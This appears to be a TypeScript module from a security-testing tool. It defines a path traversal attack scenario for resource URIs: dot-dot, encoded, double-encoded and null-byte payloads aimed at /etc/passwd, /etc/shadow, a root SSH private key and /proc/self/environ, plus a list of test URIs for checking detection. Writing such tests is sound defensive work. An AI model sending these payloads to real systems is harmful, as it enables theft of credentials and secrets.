/**
 * @module scenarios/uri-traversal
 * S42: Resources expose paths outside allowed scope.
 */

import type { AttackScenario } from '../types.js';

export const URI_TRAVERSAL_SCENARIO: AttackScenario = {
  id: 'uri-traversal-01',
  name: 'Resource URI Traversal',
  type: 'uri-traversal',
  description: 'Tests path canonicalization bypass variants for resource access',
  payloads: [
    {
      id: 'ut-basic-dotdot',
      severity: 'high',
      content: 'file:///workspace/../../../etc/passwd',
      minMode: 'advanced',
    },
    {
      id: 'ut-encoded',
      severity: 'high',
      content: 'file:///workspace/%2e%2e/%2e%2e/%2e%2e/etc/shadow',
      encoding: 'url',
      minMode: 'advanced',
    },
    {
      id: 'ut-nullbyte',
      severity: 'critical',
      content: 'file:///workspace/safe.txt%00../../etc/passwd',
      minMode: 'aggressive',
    },
    {
      id: 'ut-sandbox-escape',
      severity: 'critical',
      content: 'file:///workspace/../../../../root/.ssh/id_rsa',
      minMode: 'aggressive',
    },
    {
      id: 'ut-double-encoded',
      severity: 'critical',
      content: 'file:///workspace/%252e%252e/%252e%252e/etc/passwd',
      minMode: 'aggressive',
    },
  ],
};

/** URIs used to test traversal detection */
export const TRAVERSAL_TEST_URIS = [
  'file:///workspace/../../../etc/passwd',
  'file:///workspace/%2e%2e/%2e%2e/%2e%2e/etc/shadow',
  'file:///workspace/../../../../root/.ssh/id_rsa',
  'file:///workspace/safe.txt%00../../etc/passwd',
  'file:///etc/passwd',
  'file:///proc/self/environ',
  'file:///workspace/%252e%252e/%252e%252e/etc/passwd',
] as const;
